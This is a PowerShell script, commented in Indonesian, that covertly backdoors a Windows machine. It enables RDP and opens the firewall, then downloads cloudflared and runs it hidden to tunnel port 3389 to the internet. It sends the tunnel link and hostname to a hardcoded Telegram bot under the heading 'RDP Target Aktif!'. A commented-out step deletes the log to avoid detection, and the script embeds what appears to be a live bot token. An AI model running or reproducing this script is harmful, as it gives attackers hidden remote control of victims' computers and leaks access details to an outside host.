$ErrorActionPreference = 'SilentlyContinue'

# --- KONFIGURASI ---
$TOKEN = "7520250109:AAGRiIauax-4mDUBp2CWjUqYgyrG2sncpjk"
$ID = "2029488529"
$cfPath = "$env:TEMP\cf.exe"
$logFile = "$env:TEMP\tunnel.log"

# 1. Pastikan RDP Aktif & Firewall Terbuka
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# 2. Download cloudflared jika belum ada
if (!(Test-Path $cfPath)) {
    $url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    Invoke-WebRequest -Uri $url -OutFile $cfPath -UseBasicParsing
}

# 3. Jalankan Tunnel dengan Protokol TCP
# Menggunakan 'tcp://' lebih stabil untuk RDP daripada 'rdp://' di Quick Tunnel
Stop-Process -Name "cf" -Force -ErrorAction SilentlyContinue
Start-Process -FilePath $cfPath -ArgumentList "tunnel --url tcp://localhost:3389" -RedirectStandardError $logFile -WindowStyle Hidden

# Tunggu proses handshaking dengan Cloudflare
Start-Sleep -Seconds 25

# 4. Parsing URL dan Kirim ke Telegram
if (Test-Path $logFile) {
    $content = Get-Content $logFile -Raw
    # Regex untuk menangkap subdomain .trycloudflare.com
    $urlMatch = [regex]::Match($content, 'https://[a-zA-Z0-9-]+\.trycloudflare.com')

    if ($urlMatch.Success) {
        $fullUrl = $urlMatch.Value
        $cleanUrl = $fullUrl.Replace("https://", "")
        
        $msg = @"
ðŸš€ *RDP Target Aktif!*
----------------------------
ðŸ’» *Host:* $env:COMPUTERNAME
ðŸ”— *Link:* $fullUrl

*Cara Akses dari PC kamu:*
1. Jalankan di CMD:
`cloudflared access rdp --hostname $cleanUrl --url localhost:3389`
2. Buka RDP (mstsc) ke: `localhost:3389`
----------------------------
"@
        $encodedMsg = [uri]::EscapeDataString($msg)
        Invoke-WebRequest -Uri "https://api.telegram.org/bot$TOKEN/sendMessage?chat_id=$ID&text=$encodedMsg&parse_mode=Markdown" -UseBasicParsing
    }
}

# 5. Pembersihan (Opsional: Hapus log agar tidak terdeteksi)
# Remove-Item $logFile -Force
